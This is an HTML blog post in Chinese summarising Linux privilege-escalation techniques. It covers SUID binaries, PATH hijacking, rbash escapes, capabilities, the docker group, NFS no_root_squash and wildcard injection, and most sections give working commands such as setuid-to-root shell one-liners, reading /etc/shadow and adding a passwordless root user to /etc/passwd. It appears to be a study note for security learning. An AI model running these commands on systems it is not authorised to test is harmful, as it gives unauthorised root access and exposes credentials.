@@ -1,0 +1,981 @@
+
+<!DOCTYPE HTML>
+<!--
+	Dopetrope 2.0 by HTML5 UP
+	html5up.net | @n33co
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+			<title>书言</title>
+			<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+			<meta charset="utf-8" />
+			<link href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,900,300italic" rel="stylesheet" />
+				<link rel="stylesheet" href="/theme/css/pygment.css" />
+				<link rel="stylesheet" href="/theme/css/custom-pygment.css" />
+			<noscript>
+				<link rel="stylesheet" href="/theme/css/skel-noscript.css" />
+				<link rel="stylesheet" href="/theme/css/style.css" />
+				<link rel="stylesheet" href="/theme/css/style-desktop.css" />
+			</noscript>
+		<!-- tipuesearch 放在这, 因为搜索框是全局定义的 -->
+		<link rel="stylesheet" href="/theme//Tipue-Search-5.0.0/tipuesearch.css" />
+		<link rel="stylesheet" href="/theme//Tipue-Search-5.0.0/custom/tipuesearch-custom.css" />
+		<link rel="stylesheet" href="/theme/css/alabaster.css" />
+		<link rel="stylesheet" href="/theme/css/style-update.css" />
+		<!-- <link rel="stylesheet" href="/theme/fontawesome-free-6.5.1-web/css/all.min.css" /> -->
+		<!--  <link rel="preload" as="font" type="font/woff2" crossorigin href="/theme/fontawesome-free-6.5.1-web/webfonts/fa-brands-400.woff2" />
+		<link rel="preload" as="font" type="font/woff2" crossorigin href="/theme/fontawesome-free-6.5.1-web/webfonts/fa-regular-400.woff2" />
+		<link rel="preload" as="font" type="font/woff2" crossorigin href="/theme/fontawesome-free-6.5.1-web/webfonts/fa-solid-900.woff2" />
+		<link rel="preload" as="font" type="font/woff2" crossorigin href="/theme/fontawesome-free-6.5.1-web/webfonts/fa-v4compatibility.woff2" /> -->
+	</head>
+	<body class="no-sidebar">
+		<!-- Header Wrapper -->
+			<div id="header-wrapper">
+				<div class="container">
+					<div class="row">
+						<div class="12u">
+
+							<!-- Header -->
+								<section id="header">
+
+									<!-- Logo -->
+									<div class="page-home">
+										<h1><a href="/">HOME</a></h1>
+									</div>
+
+									<!-- Nav -->
+									<div class="page-menu">
+										<nav id="nav">
+											<ul>
+
+												<!-- categories -->
+														<li ><a href="/category/ai.html">AI</a></li>
+														<li  class="active"><a href="/category/an-quan.html">安全</a></li>
+														<li ><a href="/category/ban-ben-kong-zhi.html">版本控制</a></li>
+														<li ><a href="/category/cao-zuo-xi-tong.html">操作系统</a></li>
+														<li ><a href="/category/chang-yong-gong-ju-shi-yong.html">常用工具使用</a></li>
+														<li ><a href="/category/da-shu-ju.html">大数据</a></li>
+														<li><a href="/categories.html">More...</a></li>
+											</ul>
+										</nav>
+									</div>
+								</section>
+
+						</div>
+					</div>
+					<div class="row page-head-search">
+						<form class="navbar-search" action="/search.html" role="search">
+							<!-- <button class="fa-solid fa-magnifying-glass" type="submit"></button> -->
+							<button type="submit"></button>
+							<input type="text" name="q" id="tipue_search_input" autocomplete="off" placeholder="Search...">
+							<!-- <i class="fa-solid fa-magnifying-glass"></i> -->
+						</form>
+					</div>
+  <div class="row page-head page-article persistent">
+    <div class="page-head-title">
+      <h2>提权总结</h2>
+    </div>
+    <div class="page-head-content">
+      By
+	  <a href="author/yanque.html">YanQue</a>
+      , 27 二月 2023
+      , Category:
+	  <a href="category/an-quan.html">安全</a>
+    </div>
+	<div class="red-line">
+    </div>
+  </div>
+				</div>
+			</div>
+
+
+		<!-- Main Wrapper -->
+			<div id="main-wrapper">
+				<div class="container">
+<div class="row">
+	<div class="12u">
+			<section>
+				<div>
+					<div class="row">
+						<div class="12u skel-cell-mainContent">
+							<!-- Content -->
+								<article class="box is-post">
+									<div class="post-infos">
+										<ul class="tags">
+											<li><a class="button" href="category/an-quan.html">安全</a></li>
+										</ul>
+									</div>
+
+									<div class="pennant pennant-alt date">2023-02-27</div>
+									<h2>提权总结</h2>
+									<div class="section" id="sudo-suid">
+<h2>sudo/suid提权</h2>
+<ul class="simple">
+<li>suid涉及到linux的s权限位: <a class="reference external" href="/yq-docs-operating-system-linux-Conceptual-Document-rights-limit-under-Linux.html">linux下文件权限位</a></li>
+<li>sudo可以其他用户执行, 可见: <a class="reference external" href="/yq-docs-operating-system-linux-Linux-instruction-SUDO.html">sudo</a></li>
+</ul>
+<p>一般来说, 就是利用某些具有s位权限的指令, 获取到root的权限</p>
+<p>查找具有suid权限文件:</p>
+<pre class="literal-block">
+find / -perm -u=s 2&gt;/dev/null
+</pre>
+<p>查看哪些命令能被sudo:</p>
+<pre class="literal-block">
+sudo -l
+</pre>
+<p>接下来列出具体可用于提权的一些指令</p>
+<div class="section" id="nmap">
+<h3>nmap</h3>
+<p>nmap:</p>
+<pre class="literal-block">
+echo &quot;os.execute('/bin/bash')&quot; &gt; ./shell
+nmap --script=shell
+</pre>
+</div>
+<div class="section" id="suid-find">
+<h3>suid-find</h3>
+<p>find命令自带-exec参数, 可以执行命令, 若find有suid权限, 那么使用exec相当于直接提权到root:</p>
+<pre class="literal-block">
+# find / -exec command
+find /path -exec {} \;
+</pre>
+</div>
+<div class="section" id="suid-vim">
+<h3>suid-vim</h3>
+<p>vim有了suid就可以任意文件读取了</p>
+<p>同时也可以输入:</p>
+<pre class="literal-block">
+:shell
+</pre>
+<p>来获取root shell</p>
+</div>
+<div class="section" id="bash">
+<h3>bash</h3>
+<p>开启一个新shell, suid的话自然是开启root shell:</p>
+<pre class="literal-block">
+bash -p
+</pre>
+</div>
+<div class="section" id="less-more">
+<h3>less/more</h3>
+<p>和vim差不多, 任意文件读取, 同时也可以输入:</p>
+<pre class="literal-block">
+!command
+</pre>
+<p>进行提权到root</p>
+</div>
+<div class="section" id="exim">
+<h3>exim</h3>
+<p>exim在特定版本下会有suid提权</p>
+<p>这里没懂</p>
+</div>
+<div class="section" id="section-2">
+<h3>利用环境变量</h3>
+<p>如果我们找到一个suid权限的程序, 但是我们无法完成suid提权, 就可以试试搭配环境变量进行提权.</p>
+<p>这个提权方法的思想是:</p>
+<ul class="simple">
+<li>文件具有 suid 权限</li>
+<li>文件内容有 system 函数调用, 且此调用未指定路径</li>
+<li>用户有权修改自己环境变量</li>
+</ul>
+<p>就可以通过劫持system函数里调用的脚本文件,
+使其指向我们环境变量里自行创建的一个同名脚本文件,
+那么自行创建的同名脚本文件就能以root权限运行了,
+如果这个脚本文件里的命令是/bin/bash, 那么就相当于提权了.</p>
+<p><strong>例</strong></p>
+<p>对于被攻击者, 创建一个具有以上条件的文件:</p>
+<pre class="literal-block">
+┌──(root㉿3675b5ebb8ce)-[~]
+└─# cat demo.c
+# include &lt;unistd.h&gt;
+# include &lt;stdlib.h&gt;
+
+void main (){
+  setuid(0);
+  setgid(0);
+
+  system(&quot;ps&quot;);
+}
+
+
+┌──(root㉿3675b5ebb8ce)-[~]
+└─# gcc demo.c -o do_ps
+
+┌──(root㉿3675b5ebb8ce)-[~]
+└─# chmod u+s do_ps
+
+┌──(root㉿3675b5ebb8ce)-[~]
+└─# ls -lh do_ps
+-rwsr-xr-x 1 root root 69K Mar  4 14:44 do_ps
+
+┌──(root㉿3675b5ebb8ce)-[~]
+└─# ./do_ps
+  PID TTY          TIME CMD
+    9 pts/1    00:00:00 bash
+  31 pts/1    00:00:00 do_ps
+  32 pts/1    00:00:00 sh
+  33 pts/1    00:00:00 ps
+
+┌──(root㉿3675b5ebb8ce)-[~]
+└─# mv do_ps /home/yanque/test/
+</pre>
+<p>对于攻击者而言:</p>
+<pre class="literal-block">
+┌──(yanque㉿3675b5ebb8ce)-[~]
+└─$ find / -perm -u=s -type f 2&gt;/dev/null
+/home/yanque/test/do_ps
+
+┌──(yanque㉿3675b5ebb8ce)-[~]
+└─$ test/do_ps
+  PID TTY          TIME CMD
+    9 pts/1    00:00:00 bash
+  51 pts/1    00:00:00 su
+  67 pts/1    00:00:00 do_ps
+  68 pts/1    00:00:00 sh
+  69 pts/1    00:00:00 ps
+</pre>
+<p>发现返回了ps命令的结果, 可此猜测这个文件内部 有 system(“ps”); 类似这样的代码.</p>
+<div class="sidebar">
+<p class="first sidebar-title">测试...</p>
+<p>本地测试的时候 export 一直失败...</p>
+<pre class="literal-block">
+┌──(yanque㉿3675b5ebb8ce)-[~/test]
+└─$ export $PATH=&quot;/home/yanque/test:$PATH&quot;
+-bash: export: `/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games=/home/yanque/test:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games': not a valid identifier
+</pre>
+<p class="last">遂放弃</p>
+</div>
+<p>然后进行以下尝试:</p>
+<pre class="literal-block">
+cd /tmp
+echo &quot;/bin/bash&quot; &gt; ps
+export $PATH=/tmp:$PATH        # 需要修改自身环境变量的权限, 但基本上都有这个权限
+chmod 777 ./ps                 # 没这条命令会导致提权失败
+cd ~
+test/do_ps                     # 提权成功
+</pre>
+</div>
+</div>
+<div class="section" id="rbash">
+<h2>rbash绕过</h2>
+<p>rbash, 是出于安全性考虑的一个功能受限的bash, 他的限制性可能会有如下.</p>
+<ul class="simple">
+<li>cd 切换目录</li>
+<li>含有斜杠 / 的命令, 譬如 /bin/sh</li>
+<li>设置 PATH ENV 等环境变量</li>
+<li>使用 &gt; &lt; 进行重定向</li>
+<li>binary 的运行.
+通常 root 用户会手动创建 <tt class="docutils literal">/bin/binary_file <span class="pre">-&gt;</span> /home/rbash_user/bin/binary_file</tt>
+的软链接,
+限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 echo $SHELL, 可以获取当前环境是否是 rbash.</li>
+</ul>
+<p>使用scp发送自己的bash进行绕过:</p>
+<pre class="literal-block">
+# 发送到当前用户的环境变量路径下
+scp /usr/bin/bash user&#64;ip:/home/test/bash
+
+# 执行
+bash -p
+</pre>
+<p>同时这里也可以想到, 很多命令如man,git config help,more,less,vim,vi,ftp,gdb等,
+都有自己的shell, 只需在他们各自的shell中执行/bin/sh即可进入bash界面, 一般都是在shell键入:</p>
+<pre class="literal-block">
+!/bin/sh
+</pre>
+<p>来 bypass rbash</p>
+<div class="section" id="vim">
+<h3>vim</h3>
+<p>如对于vim, 可执行以下命令绕过:</p>
+<pre class="literal-block">
+:set shell=/bin/bash
+:shell
+</pre>
+</div>
+<div class="section" id="find">
+<h3>find</h3>
+<p>对于find来说:</p>
+<pre class="literal-block">
+find -exec /bin/bash \;
+</pre>
+</div>
+<div class="section" id="cp">
+<h3>cp</h3>
+<p>对于cp:</p>
+<pre class="literal-block">
+# 查看当前用户环境变量
+export -p
+
+# 然后使用cp 将 /usr/bin 下文件复制过来即可
+</pre>
+</div>
+<div class="section" id="section-3">
+<h3>编程语言绕过</h3>
+<p>python:</p>
+<pre class="literal-block">
+python -c &quot;import os;os.system('/bin/bash')&quot;
+</pre>
+<p>php:</p>
+<pre class="literal-block">
+# php -a 进入php shell
+exec(&quot;/bin/bash&quot;);
+</pre>
+<p>perl:</p>
+<pre class="literal-block">
+perl -e 'exec &quot;/bin/sh&quot;;'
+</pre>
+<p>ruby:</p>
+<pre class="literal-block">
+ruby -e 'exec &quot;/bin/bash&quot;'
+</pre>
+</div>
+<div class="section" id="ssh">
+<h3>ssh</h3>
+<p>对于ssh, 通过ssh链接当前IP的当前用户并启动/bin/bash:</p>
+<pre class="literal-block">
+ssh username&#64;Ip -t &quot;/bin/bash&quot;
+</pre>
+</div>
+</div>
+<div class="section" id="section-4">
+<h2>内核提权</h2>
+<p>先查看系统内核版本:</p>
+<pre class="literal-block">
+uname -a
+</pre>
+<p>然后找exp打</p>
+</div>
+<div class="section" id="passwdshadow">
+<h2>passwd和shadow</h2>
+<div class="section" id="section-5">
+<h3>明文密码</h3>
+<p>/etc/passwd 默认所有用户可读, 但只有root可写.
+/etc/passwd里的用户口令往往以x代替, 其加密后的密码会存入/etc/shadow里面, /etc/shadow默认只有root可读.</p>
+<p>但是有小概率情况, 明文密码就直接出现在/etc/passwd了, 如果有这个情况且root密码暴露在了passwd里, 那么就可以轻而易举提权了</p>
+</div>
+<div class="section" id="passwd">
+<h3>passwd 可写</h3>
+<!-- todo: 记得有一个加密用户密码写入的例子, 后面补充 -->
+<p>如果/etc/passwd 我们当前用户可写, 可以直接把root的密码改成一个明文密码, 从而达到提权目的</p>
+</div>
+<div class="section" id="shadow">
+<h3>爆破shadow</h3>
+<p>如果/etc/shadow 可读, 我们可以用hashcat或者john暴力破解shadow文件</p>
+</div>
+</div>
+<div class="section" id="crontab">
+<h2>计划任务(crontab)</h2>
+<div class="section" id="section-6">
+<h3>文件重写</h3>
+<p>计划任务由crontab管理, 非root用户是无法列出root用户的计划任务的, 但我们可以列出/etc的系统任务, 系统任务默认是root权限运行的:</p>
+<pre class="literal-block">
+ls -l /etc/cron*
+</pre>
+<p>如果我们有幸有权限能更改其中一个任务指定的脚本, 我们就可以往脚本里添加如反弹shell等指令, 从而提权</p>
+</div>
+<div class="section" id="section-7">
+<h3>环境变量劫持</h3>
+<p>查看定时任务</p>
+<p>发现定义了诸多环境变量, 如果其任务有未指定绝对路径的指令, 如:</p>
+<pre class="literal-block">
+17 *    * * *   root    shell.sh
+</pre>
+<p>而且我们在其环境变量路径中可以进行写入操作, 那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持</p>
+<p>比如我们在/sbin 写入一个 反弹shell功能的shell.sh, 那么就可以造成提权</p>
+</div>
+</div>
+<div class="section" id="section-8">
+<h2>密码查找</h2>
+<p>这个提权技术说白了, 就是去到处翻密码</p>
+<p>可以通过以下命令, 指定关键字, 在所有文件中搜索内容中有关键字的文件:</p>
+<pre class="literal-block">
+grep --color=auto -rnw '/' -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null
+find . -type f -exec grep -i -I &quot;PASSWORD&quot; {} /dev/null \;
+</pre>
+<p>查找十分钟内更改过的文件:</p>
+<pre class="literal-block">
+find / -mmin -10 2&gt;/dev/null | grep -Ev &quot;^/proc&quot;  (不显示^/proc文件或文件夹)
+</pre>
+</div>
+<div class="section" id="capabilities">
+<h2>capabilities</h2>
+<p>capabilities 是linux2.2后出现的产物, 它的出现一定程度上弥补了suid这种粗糙的权限管理机制,
+但是capabilities 自身也有造成提权的安全隐患</p>
+<div class="section" id="section-9">
+<h3>简介</h3>
+<p>capabilities 把root的权限细分了, 可以分别启用或者禁用.</p>
+<div class="sidebar">
+<p class="first sidebar-title">euid</p>
+<p class="last">见 <a class="reference external" href="/yq-docs-operating-system-linux-Conceptual-Document-rights-limit-under-Linux.html">linux下文件权限位</a> 下 <strong>文件权限的s位和t位的理解</strong> 小节</p>
+</div>
+<p>在进行特权操作的时候, 如果 euid 不是root,
+那么系统就会检查是否具有执行特权操作的对应capabilities , 并以此为凭据决定特权操作是否能被执行.</p>
+<p>如下是一些常见的特权操作及其对应capabilities</p>
+<table border="1" class="docutils">
+<colgroup>
+<col width="50%" />
+<col width="50%" />
+</colgroup>
+<tbody valign="top">
+<tr><td>改变文件的所属者(chown())</td>
+<td>CAP_CHOWN</td>
+</tr>
+<tr><td>向进程发送信号(kill() signal())</td>
+<td>CAP_KILL</td>
+</tr>
+<tr><td>改变进程的uid(setuid() setreuid() setresuid()等)</td>
+<td>CAP_SETUID</td>
+</tr>
+<tr><td>trace进程(ptrace())</td>
+<td>CAP_SYS_PTRACE</td>
+</tr>
+<tr><td>设置系统时间(settimeofday() stime()等)</td>
+<td>CAP_SYS_TIME</td>
+</tr>
+<tr><td>忽略文件读及目录搜索的DAC访问限制</td>
+<td>CAP_DAC_READ_SEARCH</td>
+</tr>
+</tbody>
+</table>
+<p>关于capabilities的管理工具有如下:</p>
+<ul class="simple">
+<li><a class="reference internal" href="#getcap">getcap</a></li>
+<li>setcap</li>
+<li>capsh</li>
+<li>filecap</li>
+</ul>
+<div class="section" id="getcap">
+<h4>getcap</h4>
+<p>getcap 用于查询capabilities, setcap用于设置capabilities,
+capsh用于查当前shell进程的capabilities, filecap既能设置又能查询.</p>
+<p>我们可以通过以下指令搜索设置了capabilities的可执行文件:</p>
+<pre class="literal-block">
+getcap -r / 2&gt;/dev/null
+</pre>
+</div>
+</div>
+<div class="section" id="cap-setuid">
+<h3>实操 - 通过 cap_setuid</h3>
+<p>cap_setuid 可以设置当前用户的euid, 我们可以通过此选项来进行一些提权.</p>
+<p>以python为例:</p>
+<pre class="literal-block">
+./python3.8 = cap_setuid+eip
+</pre>
+<p>现python3.8 有cap_setuid权限, 那么我们可以用以下指令进行提权:</p>
+<pre class="literal-block">
+python -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
+</pre>
+<p>类似的有很多</p>
+<p>perl:</p>
+<pre class="literal-block">
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;'
+</pre>
+<p>gdb:</p>
+<pre class="literal-block">
+gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+</pre>
+<p>php:</p>
+<pre class="literal-block">
+php -r &quot;posix_setuid(0); system('/bin/sh');&quot;
+</pre>
+<p>python:</p>
+<pre class="literal-block">
+python -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
+</pre>
+<p>rvim (需要支持python3模块)</p>
+<pre class="literal-block">
+rvim -c ':py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)'
+</pre>
+<p>vim (需要支持python3模块, <tt class="docutils literal">vim <span class="pre">--version</span></tt> 查询, 是否支持py3)</p>
+<pre class="literal-block">
+vim -c ':py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)'
+</pre>
+</div>
+<div class="section" id="cap-dac-read-search">
+<h3>实操 - 通过 CAP_DAC_READ_SEARCH</h3>
+<p>cap_dac_read_search 可以绕过文件的读权限检查以及目录的读/执行权限的检查.</p>
+<p>利用此特性我们可以读取系统中的敏感信息.</p>
+<p>如果tar有此权限, 我们可以通过此来查看敏感文件内容:</p>
+<pre class="literal-block">
+tar cvf shadow.tar /etc/shadow  //创建压缩文件
+
+tar -xvf shadow.tar  //解压缩
+
+cd etc  //进入解压缩的目录
+
+chmod +r shadow  //赋予读权限
+
+cat shadow | grep root  //查看shadow文件的内容
+</pre>
+</div>
+</div>
+<div class="section" id="docker">
+<h2>Docker</h2>
+<p>Docker用户组提权</p>
+<p>如果我们拿到了一个Docker用户组的用户权限, 那么我们可以很轻松地完成提权</p>
+<p>首先我们执行如下命令:</p>
+<pre class="literal-block">
+docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh
+</pre>
+<p>然后在其中的/etc/passwd中写入一个root权限用户（这里直接无密码了）</p>
+<pre class="literal-block">
+root2::0:0::/root:/bin/bash
+</pre>
+<p>然后退出来, 直接尝试:</p>
+<pre class="literal-block">
+su root2
+</pre>
+</div>
+<div class="section" id="nfs">
+<h2>NFS</h2>
+<p>NFS 是一个用来共享目录的东西, 但若配置权限不当则会引发安全问题</p>
+<p><strong>no_root_squash</strong></p>
+<p>我们 <tt class="docutils literal">cat /etc/exports</tt> 如果有 <tt class="docutils literal">no_root_squash</tt> 字样,
+则说明root用户会对共享目录拥有至高的权限控制, 就像是对本机的目录操作一样.</p>
+<p>也就是说, 任何机器的root在此目录上都有最高权限.</p>
+<p>我们在获得一台机器的root权限后, 可以通过nfs在另一台低权限机器上实现提权:</p>
+<pre class="literal-block">
+mkdir /tmp/nfs
+mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs  # 将本机上的/tmp/nfs 挂载到共享目录
+cp /bin/bash /tmp/nfs/bash
+chmod u+s /tmp/nfs/bash  设置共享目录上bash的suid
+</pre>
+<p>回到低权限机, 执行 /tmp/bash  完成提权</p>
+</div>
+<div class="section" id="section-10">
+<h2>通配符提权</h2>
+<p><a class="reference external" href="https://www.secpulse.com/archives/72965.html">利用通配符实现Linux本地提权</a></p>
+<p>一种古老的UNIX黑客技术—通配符注入</p>
+<p>通配符是一个字符或一组字符, 可以用来替换某些范围/类别的字符. 在执行任何其他操作之前, 通配符首先要经过shell进行解释.</p>
+<p>一些常见的通配符:</p>
+<pre class="literal-block">
+*     星号可以与文件名中的任意数量的字符匹配, 包括0个字符.
+?     问号用于匹配任意单个字符.
+[]   括号内包括一组字符, 其中任何一个字符都可以匹配该位置上的单个字符.
+–     []中的连字符表示字符范围.
+~     单词开头的波浪符表示当前用户的主目录的名称. 如果该字符后面是另一个用户的登录名, 则表示该用户的主目录.
+</pre>
+<div class="section" id="chown">
+<h3>例1-通过Chown劫持文件所有者</h3>
+<p>前置, root想给多用户提供一个公共的目录:</p>
+<pre class="literal-block">
+┌──(root㉿3675b5ebb8ce)-[~]
+└─# mkdir /tmp/common
+
+┌──(root㉿3675b5ebb8ce)-[~]
+└─# chmod 777 /tmp/common
+</pre>
+<p>用户 yanque 在其下创建了三个文件:</p>
+<pre class="literal-block">
+┌──(yanque㉿3675b5ebb8ce)-[/tmp/common]
+└─$ touch file1.php file2.php file3.php
+
+┌──(yanque㉿3675b5ebb8ce)-[/tmp/common]
+└─$ ls -lh
+total 0
+-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59 file1.php
+-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59 file2.php
+-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59 file3.php
+</pre>
+<p>攻击者 yq 发现了这个目录下的文件都是 yanque 的, 猜测root用户可能会对其使用通配符的方式进行授权操作, 于是做出以下操作:</p>
+<pre class="literal-block">
+┌──(yq㉿3675b5ebb8ce)-[/tmp/common]
+└─$ echo &gt;--reference=my.php
+
+┌──(yq㉿3675b5ebb8ce)-[/tmp/common]
+└─$ echo &gt;my.php
+
+┌──(yq㉿3675b5ebb8ce)-[/tmp/common]
+└─$ ls -lh
+total 8.0K
+-rw-r--r-- 1 yq     yq     1 Mar  5 16:04 '--reference=my.php'
+-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59  file1.php
+-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59  file2.php
+-rw-r--r-- 1 yanque yanque 0 Mar  5 15:59  file3.php
+-rw-r--r-- 1 yq     yq     1 Mar  5 16:04  my.php
+</pre>
+<div class="admonition tip">
+<p class="first admonition-title">技巧</p>
+<p>猜测root可能会执行:</p>
+<pre class="literal-block">
+cd /tmp/common &amp;&amp; chown -R yanque:yanque *.php
+</pre>
+<p>企图让实际执行指令变为:</p>
+<pre class="last literal-block">
+chown yanque:yanque /tmp/common/* --reference=my.php
+</pre>
+</div>
+<p>root因为某些不知名的原因进行了授权操作:</p>
+<pre class="literal-block">
+┌──(root㉿3675b5ebb8ce)-[/]
+└─# cd /tmp/common/
+
+┌──(root㉿3675b5ebb8ce)-[/tmp/common]
+└─# chown -R yanque:yanque *.php
+chown: cannot access 'yanque:yanque': No such file or directory
+
+┌──(root㉿3675b5ebb8ce)-[/tmp/common]
+└─# ls -lh
+total 8.0K
+-rw-r--r-- 1 yq yq 1 Mar  5 16:04 '--reference=my.php'
+-rw-r--r-- 1 yq yq 0 Mar  5 15:59  file1.php
+-rw-r--r-- 1 yq yq 0 Mar  5 15:59  file2.php
+-rw-r--r-- 1 yq yq 0 Mar  5 15:59  file3.php
+-rw-r--r-- 1 yq yq 1 Mar  5 16:04  my.php
+</pre>
+<p>权限变成了yq的.</p>
+</div>
+<div class="section" id="tar">
+<h3>例2-通过tar投送漏洞利用代码</h3>
+</div>
+</div>
+
+								</article>
+						</div>
+					</div>
+				</div>
+			</section>
+	</div>
+</div>
+
+				</div>
+			</div>
+
+		<!-- Sider Bar -->
+		<div id="right-side-bar">
+	<nav>
+		<div id="top-toc-tree-container" class="fixed-container">
+			<div class="toc-contents-title">
+				<h4>Contents</h4>
+				<span class="tool-tip-text">点击隐藏</span>
+			</div>
+			<div id="toc-tree-container">
+ <ul class="toc-tree visible">
+  <li class="toc-h0">
+   <a class="" href="#sudo-suid">
+    sudo/suid提权
+   </a>
+   <ul class="toc-tree visible">
+    <li class="toc-h1">
+     <a class="" href="#nmap">
+      nmap
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#suid-find">
+      suid-find
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#suid-vim">
+      suid-vim
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#bash">
+      bash
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#less-more">
+      less/more
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#exim">
+      exim
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#section-2">
+      利用环境变量
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li class="toc-h0">
+   <a class="" href="#rbash">
+    rbash绕过
+   </a>
+   <ul class="toc-tree visible">
+    <li class="toc-h1">
+     <a class="" href="#vim">
+      vim
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#find">
+      find
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#cp">
+      cp
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#section-3">
+      编程语言绕过
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#ssh">
+      ssh
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li class="toc-h0">
+   <a class="" href="#section-4">
+    内核提权
+   </a>
+  </li>
+  <li class="toc-h0">
+   <a class="" href="#passwdshadow">
+    passwd和shadow
+   </a>
+   <ul class="toc-tree visible">
+    <li class="toc-h1">
+     <a class="" href="#section-5">
+      明文密码
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#passwd">
+      passwd 可写
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#shadow">
+      爆破shadow
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li class="toc-h0">
+   <a class="" href="#crontab">
+    计划任务(crontab)
+   </a>
+   <ul class="toc-tree visible">
+    <li class="toc-h1">
+     <a class="" href="#section-6">
+      文件重写
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#section-7">
+      环境变量劫持
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li class="toc-h0">
+   <a class="" href="#section-8">
+    密码查找
+   </a>
+  </li>
+  <li class="toc-h0">
+   <a class="" href="#capabilities">
+    capabilities
+   </a>
+   <ul class="toc-tree visible">
+    <li class="toc-h1">
+     <a class="" href="#section-9">
+      简介
+     </a>
+     <ul class="toc-tree visible">
+      <li class="toc-h2">
+       <a class="" href="#getcap">
+        getcap
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#cap-setuid">
+      实操 - 通过 cap_setuid
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#cap-dac-read-search">
+      实操 - 通过 CAP_DAC_READ_SEARCH
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li class="toc-h0">
+   <a class="" href="#docker">
+    Docker
+   </a>
+  </li>
+  <li class="toc-h0">
+   <a class="" href="#nfs">
+    NFS
+   </a>
+  </li>
+  <li class="toc-h0">
+   <a class="" href="#section-10">
+    通配符提权
+   </a>
+   <ul class="toc-tree visible">
+    <li class="toc-h1">
+     <a class="" href="#chown">
+      例1-通过Chown劫持文件所有者
+     </a>
+    </li>
+    <li class="toc-h1">
+     <a class="" href="#tar">
+      例2-通过tar投送漏洞利用代码
+     </a>
+    </li>
+   </ul>
+  </li>
+ </ul>
+</div>
+
+		</div>
+	</nav>
+	<div id="sidebar-tools" class="fixed-container no-active">
+		<!-- 按钮 使用 content 绘制图标 -->
+	</div>
+	<div id="sidebar-tool-back-top" class="fixed-container">
+		<!-- 按钮 使用 content 绘制图标 -->
+	</div>
+		</div>
+
+		<!-- Footer Wrapper -->
+			<div id="footer-wrapper">
+				<!-- Footer -->
+					<section id="footer" class="container">
+						<div class="row">
+							<div class="8u">
+								<section>
+									<header>
+										<h2>Latest articles</h2>
+									</header>
+									<ul class="dates">
+										<li>
+											<span class="date"> 3 <strong>29</strong></span>
+											<h3><a href="yq-docs-front-end-node-Three--party-library-pm2.html">pm2</a></h3>
+											<p><p class="first last">pm2-守护进程管理器</p>
+</p>
+										</li>
+										<li>
+											<span class="date"> 3 <strong>29</strong></span>
+											<h3><a href="yq-docs-rear-end-dart.html">dart</a></h3>
+											<p><p class="first last">dart初识</p>
+</p>
+										</li>
+										<li>
+											<span class="date"> 3 <strong>28</strong></span>
+											<h3><a href="yq-frontend-theia-drop.html">Theia-拖动文件到编辑器</a></h3>
+											<p><p class="first last">Theia-拖动文件到编辑器</p>
+</p>
+										</li>
+										<li>
+											<span class="date"> 3 <strong>26</strong></span>
+											<h3><a href="yq-docs-front-end-Conceptual-Window.html">浏览器Window对象</a></h3>
+											<p><p class="first last">浏览器环境下的Window对象</p>
+</p>
+										</li>
+									</ul>
+								</section>
+							</div>
+						</div>
+						<div class="row">
+							<div class="4u">
+								<section>
+									<header>
+										<h2>Blogroll</h2>
+									</header>
+									<ul class="divided">
+											<li><a href="https://yq-yqr.readthedocs.io/zh/blog-theme/blog.html">旧版(迁移中)</a></li>
+											<li><a href="https://getpelican.com/">Pelican</a></li>
+											<li><a href="https://www.python.org/">Python.org</a></li>
+											<li><a href="https://palletsprojects.com/p/jinja/">Jinja2</a></li>
+									</ul>
+								</section>
+							</div>
+							<div class="4u">
+								<section>
+									<header>
+										<h2>Categories</h2>
+									</header>
+									<ul class="divided">
+											<li><a href="/category/ai.html">AI</a></li>
+											<li><a href="/category/an-quan.html">安全</a></li>
+											<li><a href="/category/ban-ben-kong-zhi.html">版本控制</a></li>
